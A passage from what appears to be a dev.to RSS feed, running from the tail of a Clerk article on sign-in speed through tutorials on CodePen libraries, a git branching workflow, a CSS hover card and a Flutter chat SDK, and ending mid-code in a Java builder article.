&lt;p&gt;After collecting a few months of data, we realized we should make an adjustment.  There was a near 50/50 split of users who preferred Social Sign In vs email and password.  But, Social Sign In was also faster: ~5 seconds on average compared to ~8 seconds for email and password. So we made the switch:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sJNqVGtA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1625242049132/EeJkSYpP9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sJNqVGtA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1625242049132/EeJkSYpP9.png" alt="Email.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the months since making this change, Social Sign In usage has started to outpace email and password, with the last month seeing a 52/48 split.&lt;/p&gt;

&lt;p&gt;As expected, since more users are now using a faster authentication strategy, that shift has also resulted in a faster overall speed of Sign In.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#passwordless-should-remain-a-fallback"&gt;
  &lt;/a&gt;
  Passwordless should remain a fallback
&lt;/h2&gt;

&lt;p&gt;The passwordless concept has existed in authentication systems for decades.  If a user forgets their password, a code or link sent to their email address can be used to authenticate instead.&lt;/p&gt;

&lt;p&gt;Recently, there has been a lot of buzz about promoting passwordless flows to the primary authentication mechanism.  While we allow developers to configure &lt;a href="https://clerk.dev/?utm_source=devto&amp;amp;utm_medium=blog&amp;amp;utm_campaign=crossposting"&gt;Clerk&lt;/a&gt; in this manner, we recommend against it, and instead suggest leaving it as a fallback.&lt;/p&gt;

&lt;p&gt;On average, we see passwordless flows take ~35 seconds to complete.  Despite using Sendgrid to deliver our emails quickly and with high inbox rates, the process of checking email is just &lt;em&gt;slow&lt;/em&gt; in comparison to Social Sign In or email and password.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-edge-cases-of-social-sign-in-are-surprisingly-common"&gt;
  &lt;/a&gt;
  The "edge cases" of Social Sign In are surprisingly common
&lt;/h2&gt;

&lt;p&gt;While building &lt;a href="https://clerk.dev/?utm_source=devto&amp;amp;utm_medium=blog&amp;amp;utm_campaign=crossposting"&gt;Clerk&lt;/a&gt;, we cataloged any frustrating user experiences we encountered across the web and made sure to fix them. The source of many screenshots was Social Sign In - even among the web's biggest properties, it's common to stop users from using a Social Sign In if they didn't originally Sign Up that way:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SsgVoi_D--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1625242087389/RXkz9mzeU.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SsgVoi_D--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1625242087389/RXkz9mzeU.png" alt="ebayspotifyexamples.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;While it's obvious that roadblocks like these slow the sign in process, handling them elegantly takes a lot of development time. Many developers are comfortable pushing off a proper solution because these scenarios feel like edge cases.&lt;/p&gt;

&lt;p&gt;In practice, we've learned that these "edge cases" are surprisingly common. In fact, 15.9% of users who have used Social Sign In have also used another method. Of those:&lt;/p&gt;

&lt;p&gt;2 in 3 originally signed up with a password then later chose Social Sign In&lt;br&gt;
1 in 3 originally signed up with Social Sign In, then later tried signed in without (they were sent a code to their email)&lt;br&gt;
At Clerk, we've invested heavily in handling these scenarios as elegantly and quickly as possible. Regardless of a user's choice of sign in strategy, they will always be linked to the same underlying account.&lt;/p&gt;

&lt;p&gt;Clerk's prebuilt Sign In UI&lt;br&gt;
Clerk enables developers to add beautiful, high-conversion Sign In form to their application in minutes. Our prebuilt UI can easily be themed to match any company's brand and style guidelines.&lt;/p&gt;

&lt;p&gt;We're constantly analyzing the data in search of better user experiences, as well as evaluating new technologies for addition to our product. If you have questions or ideas for improvement, reach out to us on Twitter &lt;a href="https://twitter.com/ClerkDev"&gt;@ClerkDev&lt;/a&gt;, or through &lt;a href="https://clerk.dev/support?utm_source=devto&amp;amp;utm_medium=blog&amp;amp;utm_campaign=crossposting"&gt;support&lt;/a&gt;.&lt;/p&gt;




&lt;p&gt;&lt;em&gt;This article was originally published on &lt;a href="https://clerk.dev/blog/designing-fast-sign-in-forms?utmsource=devto&amp;amp;utmmedium=blog&amp;amp;utmcampaign=crossposting"&gt;Clerk.dev&lt;/a&gt; by Colin Sidoti, CEO and Co-Founder of Clerk.&lt;/em&gt;&lt;/p&gt;

</description>
      <category>authentication</category>
      <category>authorization</category>
      <category>oauth</category>
      <category>passwordless</category>
    </item>
    <item>
      <title>How To use libraries and framework in Codepen</title>
      <author>Nishtha Neeraj Kushwah</author>
      <pubDate>Fri, 02 Jul 2021 16:10:56 +0000</pubDate>
      <link>https://dev.to/nishthaneeraj/how-to-libraries-and-framework-in-codepen-321e</link>
      <guid>https://dev.to/nishthaneeraj/how-to-libraries-and-framework-in-codepen-321e</guid>
      <description>&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;## Table Of Contents&lt;br&gt;
  &lt;a href="#code"&gt;What is Codepen?&lt;/a&gt;&lt;br&gt;
  &lt;a href="#chapter-1"&gt;How To add CSS Frameworks&lt;/a&gt;&lt;br&gt;
  &lt;a href="#chapter-2"&gt;How To add JS Libraries&lt;/a&gt;&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;
&lt;h2&gt;
&lt;br&gt;
  &lt;a href="#what-is-codepen"&gt;&lt;br&gt;
  &lt;/a&gt;&lt;br&gt;
  What is Codepen? &lt;a&gt;&lt;/a&gt;&lt;br&gt;
&lt;/h2&gt;

&lt;p&gt;Ans. CodePen is an online community for testing and showcasing user-created HTML, CSS and JavaScript code snippets. It functions as an online code editor and open-source learning environment, where developers can create code snippets, called "pens," and test them.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-to-add-css-frameworks"&gt;
  &lt;/a&gt;
  How To add CSS Frameworks &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Headover To Your CSS Section
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dw5jFfS7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://confident-lalande-9a807b.netlify.app/Frame%25201.png" alt="Step1"&gt;
&lt;/li&gt;
&lt;li&gt;Click on the settings(wheel) icon 
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--TVI4Y-5z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://confident-lalande-9a807b.netlify.app/Frame%25202.png" alt="Step2"&gt;
&lt;/li&gt;
&lt;li&gt;Then Scroll Down and find the &lt;strong&gt;Add External Stylesheets/Pens&lt;/strong&gt;
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--pBlddaTV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://confident-lalande-9a807b.netlify.app/step2.jpg" alt="Step1"&gt;
&lt;/li&gt;
&lt;li&gt;And then in the input section add your style sheet url or search for any style sheet in searchbox 
(for example:bootstrap's css link &lt;a href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"&gt;https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css&lt;/a&gt;)
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--I3LiuBNC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://confident-lalande-9a807b.netlify.app/Frame%25203.png" alt="Step1"&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;
  &lt;a href="#done-now-you-can-use-your-linked-stylesheet-in-your-codepen-project-as-usual-now-do-same-for-javascript"&gt;
  &lt;/a&gt;
  Done Now You can use your linked stylesheet in your codepen project as usual now do same for javascript
&lt;/h4&gt;

&lt;h3&gt;
  &lt;a href="#how-to-add-js-libraries"&gt;
  &lt;/a&gt;
  How To add JS Libraries &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Headover To Your JS Section&lt;/li&gt;
&lt;li&gt;Click on the settings(wheel) icon &lt;/li&gt;
&lt;li&gt;Then Scroll Down and find the &lt;strong&gt;Add External Scripts/Pens&lt;/strong&gt;
&lt;/li&gt;
&lt;li&gt;And then in the input section add your script sheet url or search for any script in searchbox
(for example: bootstrap's JavaScript link &lt;a href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"&gt;https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js&lt;/a&gt;)&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>css</category>
      <category>javascript</category>
      <category>codepen</category>
    </item>
    <item>
      <title>YAGBW - Yet Another Git Branching Workflow</title>
      <author>Antonio Pastorino</author>
      <pubDate>Fri, 02 Jul 2021 15:50:20 +0000</pubDate>
      <link>https://dev.to/andou/yagbw-yet-another-git-branching-workflow-hf4</link>
      <guid>https://dev.to/andou/yagbw-yet-another-git-branching-workflow-hf4</guid>
      <description>&lt;p&gt;Hey guys! &lt;a href="https://github.com/andou"&gt;Andou&lt;/a&gt; here, backend engineer / web developer / tech leader for &lt;a href="https://www.bitmama.it/"&gt;Bitmama Reply&lt;/a&gt;, an Italian web agency headquartered in Milan, Turin and London. &lt;/p&gt;

&lt;p&gt;In this article I would like to talk to you about &lt;strong&gt;YAGBW - Yet Another Git Branching Workflow&lt;/strong&gt;, the git branching workflow we usually work with.&lt;/p&gt;

&lt;p&gt;Let's get started!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#intro-branching-workflows"&gt;
  &lt;/a&gt;
  Intro: branching workflows
&lt;/h2&gt;

&lt;p&gt;When you decide to version control your project (and you should do) using git, you are somewhat asked to choose a branching model or workflow.&lt;/p&gt;

&lt;p&gt;I've listed the most common workflows in my &lt;a href="https://github.com/andou/tech-resources#branching-models"&gt;tech resources list&lt;/a&gt;, which are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://nvie.com/posts/a-successful-git-branching-model/"&gt;Git Flow&lt;/a&gt; : Probably the most famous branching model&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://guides.github.com/introduction/flow/"&gt;GitHub Flow&lt;/a&gt; : My favourite branching model, good for CI/CD&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://trunkbaseddevelopment.com/"&gt;Trunk Based Development&lt;/a&gt; : A skinny model good for initial project phases&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#yagbw-basics"&gt;
  &lt;/a&gt;
  YAGBW / Basics
&lt;/h2&gt;

&lt;p&gt;Well, without further ado, here is the branching workflow we usually adopt to handle our web projects with minor headaches and a pretty full control over delivered features.&lt;/p&gt;

&lt;p&gt;This is a solution somewhere between Git Flow and GitHub Flow.&lt;/p&gt;

&lt;p&gt;Basic rules:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You shall create a &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;) branch and a &lt;code&gt;cert&lt;/code&gt; branch&lt;/li&gt;
&lt;li&gt;You shall never push commits on &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;You shall never push commits on &lt;code&gt;cert&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;You shall never merge &lt;code&gt;cert&lt;/code&gt; on &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Developing stuff:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Every feature or bug resolution needs a specific branch, that we can refer to as &lt;em&gt;feature branches&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;em&gt;feature branches&lt;/em&gt; need a speaking name, usually &lt;code&gt;feature/&amp;lt;name&amp;gt;&lt;/code&gt; for a feature and &lt;code&gt;hotfix/&amp;lt;name&amp;gt;&lt;/code&gt; for a bug resolution&lt;/li&gt;
&lt;li&gt;You'll always create new &lt;em&gt;feature branches&lt;/em&gt; from &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;When you are done with your work on the &lt;em&gt;feature branch&lt;/em&gt; you shall first merge it on &lt;code&gt;cert&lt;/code&gt; to have it tested&lt;/li&gt;
&lt;li&gt;When your &lt;em&gt;feature branch&lt;/em&gt; has been tested, your could merge it in &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Merge &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;) in your feature branch on a regular basis
.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Deploying stuff (assuming you have at least a &lt;strong&gt;production&lt;/strong&gt; and a &lt;strong&gt;certification&lt;/strong&gt; environment):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;cert&lt;/code&gt; could be deployed at any given time on your &lt;strong&gt;certification&lt;/strong&gt; environment&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;) could be deployed at any given time on your &lt;strong&gt;production&lt;/strong&gt; environment&lt;/li&gt;
&lt;li&gt;merge &lt;em&gt;feature branche&lt;/em&gt; on &lt;code&gt;cert&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;deploy your &lt;strong&gt;certification&lt;/strong&gt; environment&lt;/li&gt;
&lt;li&gt;test&lt;/li&gt;
&lt;li&gt;merge &lt;em&gt;feature branch&lt;/em&gt; on &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;deploy your &lt;strong&gt;production&lt;/strong&gt; environment&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#yagbw-addons"&gt;
  &lt;/a&gt;
  YAGBW / Addons
&lt;/h2&gt;

&lt;p&gt;Of course the above workflow should perform well or not given the nature of the project you use it with. You may find yourself comfortable with some addons on the process:&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#addon-1-the-prelive-phase-mode"&gt;
  &lt;/a&gt;
  Addon #1 / The prelive phase mode
&lt;/h3&gt;

&lt;p&gt;Speaking of web projects there's always an initial phase where you are not online with your project and the word CI/CD makes no sense at all.&lt;br&gt;
During this phase you may consider to merge and test directly on &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#addon-2-consider-adding-pull-requests"&gt;
  &lt;/a&gt;
  Addon #2 / Consider adding pull requests
&lt;/h3&gt;

&lt;p&gt;You may find yourself comfortable introducing PRs to merge &lt;em&gt;feature branches&lt;/em&gt; on &lt;code&gt;cert&lt;/code&gt; and on &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;). It's up to you, but it may helps to control your flow.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#addon-3-use-tags"&gt;
  &lt;/a&gt;
  Addon #3 / Use tags
&lt;/h3&gt;

&lt;p&gt;Well, this is not really an addon because I strongly recommend it. Consider to make an annotated TAG for every merge on &lt;code&gt;cert&lt;/code&gt; and on &lt;code&gt;master&lt;/code&gt; (or &lt;code&gt;main&lt;/code&gt;). &lt;br&gt;
This really helps with rollbacks. &lt;/p&gt;

&lt;p&gt;Remember you can always detach a new branch from a previous tag (&lt;code&gt;git checkout -b newbranch yourtag&lt;/code&gt;).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#wrap-up"&gt;
  &lt;/a&gt;
  Wrap up
&lt;/h2&gt;

&lt;p&gt;That's all for today. I hope this has been an helpful read. Please comment with your suggestions and feedback. Also, let me know what you think about our branching workflow and if you have some other addons we should consider introducing.&lt;/p&gt;

</description>
      <category>git</category>
      <category>github</category>
      <category>workflow</category>
      <category>devops</category>
    </item>
    <item>
      <title>Amazing Profile Card Hover Using HTML &amp; CSS</title>
      <author>Nikhil Bobade </author>
      <pubDate>Fri, 02 Jul 2021 15:17:11 +0000</pubDate>
      <link>https://dev.to/nikhil27b/amazing-profile-card-hover-using-html-css-5mc</link>
      <guid>https://dev.to/nikhil27b/amazing-profile-card-hover-using-html-css-5mc</guid>
      <description>&lt;p&gt;Today I created an Amazing Profile Card. In this Hover Effect, I am using only HTML CSS to create animation.&lt;/p&gt;

&lt;p&gt;I hope you find this useful like and save this post also comments about your thoughts and new ideas for a topic. For more content follow me on Instagram &lt;a href="https://www.instagram.com/developer_nikhil27/"&gt;@developer_nikhil27&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Thank you!&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/NikhilBobade/embed/zYwGQoE?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;


&lt;div class="instagram-position"&gt;
  &lt;iframe id="instagram-liquid-tag" src="https://www.instagram.com/p/CQyjocgh7JX/embed/captioned"&gt;
  &lt;/iframe&gt;
  
&lt;/div&gt;


</description>
      <category>html</category>
      <category>css</category>
      <category>webdev</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Building a WhatsApp clone from scratch using Flutter</title>
      <author>Akash</author>
      <pubDate>Fri, 02 Jul 2021 15:05:58 +0000</pubDate>
      <link>https://dev.to/applozic/building-a-whatsapp-clone-from-scratch-using-flutter-57jg</link>
      <guid>https://dev.to/applozic/building-a-whatsapp-clone-from-scratch-using-flutter-57jg</guid>
      <description>&lt;p&gt;According to &lt;a href="https://www.statista.com/statistics/483255/number-of-mobile-messaging-users-worldwide/"&gt;Statista&lt;/a&gt;, around 2.77 billion mobile phone users accessed over-the-top messaging to communicate in 2020, and this figure is poised to reach three billion users in 2022. Of these, WhatsApp was the most popular mobile messenger app worldwide with over 2 billion users, mainly due to its first-mover advantage and user-friendly interface.&lt;/p&gt;

&lt;p&gt;However, due to concerns over the recent updates to WhatsApp’s privacy policies, &lt;a href="https://www.computerworld.com/article/3608988/whatsapps-new-privacy-policy-is-a-gift-to-other-messaging-apps.html"&gt;many users and businesses are on the lookout for alternatives&lt;/a&gt;. Check out our &lt;a href="https://www.applozic.com/blog/how-to-develop-a-secure-chat-alternative-to-whatsapp/"&gt;previous blog post&lt;/a&gt; to learn more about the security implications of WhatsApp’s policy updates.&lt;/p&gt;

&lt;p&gt;Thanks to Applzozic’s intuitive &lt;a href="https://docs.applozic.com/docs/overview"&gt;chat SDKs&lt;/a&gt; and &lt;a href="https://docs.applozic.com/reference"&gt;platform APIs&lt;/a&gt;, it‘s pretty easy to build your own chat alternative to WhatsApp! Before we delve into the code, let’s discuss the framework that we’ll use to implement our chat messenger app.&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;Why Flutter?&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--CFiVZ7rV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://www.applozic.com/blog/wp-content/uploads/2021/04/flutter-1024x576.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--CFiVZ7rV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://www.applozic.com/blog/wp-content/uploads/2021/04/flutter-1024x576.jpg" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Launched by Google in 2018, &lt;a href="https://flutter.dev/"&gt;Flutter&lt;/a&gt; is a free and open-source SDK for developing high-performing mobile, web, and desktop applications from a single codebase. &lt;/p&gt;

&lt;p&gt;An exciting feature of Flutter is its &lt;a href="https://flutter.dev/docs/resources/architectural-overview"&gt;layered structure&lt;/a&gt; that enables developers to build highly customizable and attractive apps with much lower time and effort, without compromising on performance. Moreover, experimenting new features and debugging errors is much faster in Flutter due to its &lt;a href="https://medium.com/podiihq/understanding-hot-reload-in-flutter-2dc28b317036"&gt;hot reload feature&lt;/a&gt; that reflects instant changes in the codebase within milliseconds&lt;/p&gt;

&lt;p&gt;Even though Flutter is a relatively new cross-platform app development framework compared to established contemporaries like React Native, &lt;a href="https://flutter.dev/showcase"&gt;many companies have started to migrate to Flutter&lt;/a&gt; due to its higher performance and flexible UI.&lt;/p&gt;

&lt;p&gt;Do note that we’ll only be delving into the code implementation of the app’s chat functionality using &lt;a href="https://github.com/AppLozic/Applozic-Flutter-Plugin"&gt;Applozic Flutter SDK&lt;/a&gt; in this article - &lt;a href="https://nanocastellano.medium.com/whatsapp-ui-clone-7f75773ad21b"&gt;here’s a simple tutorial&lt;/a&gt; on creating a UI for the app using Flutter.&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;Creating a new application and setting up dependencies&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;a rel="noreferrer noopener" href="https://flutter.dev/docs/get-started/codelab"&gt;flutter.dev&lt;/a&gt; has a comprehensive starter tutorial on creating your first application using Flutter. Once you are ready to integrate using the Applozic SDK, follow these steps:&lt;/p&gt;

&lt;h3&gt;&lt;strong&gt;I. Installation&lt;/strong&gt;&lt;/h3&gt;

&lt;ol&gt;&lt;li&gt;Add the following dependency in your pubspec.yaml file:&lt;/li&gt;&lt;/ol&gt;

&lt;pre&gt;&lt;code&gt;dependencies:
  # other dependencies
applozic_flutter: ^0.0.4&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2. Install the package as shown below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;flutter pub get&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3. Import the applozic_flutter in your .dart file to use the methods from Applozic:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import 'package:applozic_flutter/applozic_flutter.dart';&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;&lt;strong&gt;II. Authentication&lt;/strong&gt;&lt;/h3&gt;

&lt;h4&gt;Login&lt;/h4&gt;

&lt;p&gt;Create an Applozic user object, and pass it to the login() function as shown below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dynamic user = {
      'applicationId': "&amp;lt;APPLICATION_ID&amp;gt;",   //Mandatory
      'userId': userId.text,                 //Mandatory
      'displayName': displayName.text,
      'password': password.text,
      'authenticationTypeId': 1              //Mandatory
  };

ApplozicFlutter.login(user).then((response) {
      print("Login success : " + response)
    }).catchError((error, stack) =&amp;gt;
      print("Error while logging in : " + error.toString()));&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Please keep in mind that once the user is logged in, a new login is permitted only after the user logs out. Use this code to check if the user is already logged in:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ApplozicFlutter.isLoggedIn().then((isLoggedIn) {
        if (isLoggedIn) {
          //The user is logged in
         } esle {
          //The user is not logged in
         }
     });&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;Update logged in user details&lt;/h4&gt;

&lt;p&gt;You can update the logged in user details as given below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  dynamic user = {
                    'displayName': '&amp;lt;New name&amp;gt;'
                    'imageLink': '&amp;lt;New Image URL&amp;gt;'
                  }

  ApplozicFlutter.updateUserDetail(user)
                        .then(
                            (value) =&amp;gt; print("User details updated : " + value))
                        .catchError((e, s) =&amp;gt; print(
                            "Unable to update user details : " + e.toString()));&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;Get logged in userID&lt;/h4&gt;

&lt;p&gt;You can get the userID of the logged in user as given below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  ApplozicFlutter.getLoggedInUserId().then((userId) {
      print("Logged in userId : " + userId);
    }).catchError((error, stack) {
      print("User get error : " + error);
   });&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;
  &lt;a href="#continue-this-tutorial-on-applozic-blog"&gt;
  &lt;/a&gt;
  Continue this Tutorial on Applozic Blog!
&lt;/h2&gt;

&lt;p&gt;We have the detailed tutorial with code snippets available on &lt;a href="https://www.applozic.com/blog/building-a-whatsapp-clone-from-scratch-using-flutter/"&gt;our blog&lt;/a&gt; for you to continue with your integration!&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.applozic.com/blog/building-a-whatsapp-clone-from-scratch-using-flutter/"&gt;Click here&lt;/a&gt; to learn how to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Set up push notifications in your application&lt;/li&gt;
&lt;li&gt;Launch the Conversation screen and start messaging!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Please leave your feedback and doubts in the comments below.&lt;/p&gt;

</description>
    </item>
    <item>
      <title>Monte seu Type-Safe builder</title>
      <author>Gabriel Ronei</author>
      <pubDate>Fri, 02 Jul 2021 15:01:22 +0000</pubDate>
      <link>https://dev.to/gabrielronei/monte-seu-type-safe-builder-1i71</link>
      <guid>https://dev.to/gabrielronei/monte-seu-type-safe-builder-1i71</guid>
      <description>&lt;h2&gt;
  &lt;a href="#menu-programadores-fome-c%C3%B3digo-sobre-comida"&gt;
  &lt;/a&gt;
  Menu: programadores + fome = código sobre comida
&lt;/h2&gt;

&lt;p&gt;Dias atrás, após um dia de trabalho, estava estudando como de costume e me deu uma baita fome!&lt;/p&gt;

&lt;p&gt;Resolvi terminar os estudos antes de ir jantar, mas um lanche do &lt;em&gt;Subway&lt;/em&gt; não saia da minha cabeça...&lt;/p&gt;

&lt;p&gt;Então, quando menos percebi, a classe que eu tinha criado era assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetais&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                  &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetais&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                  &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
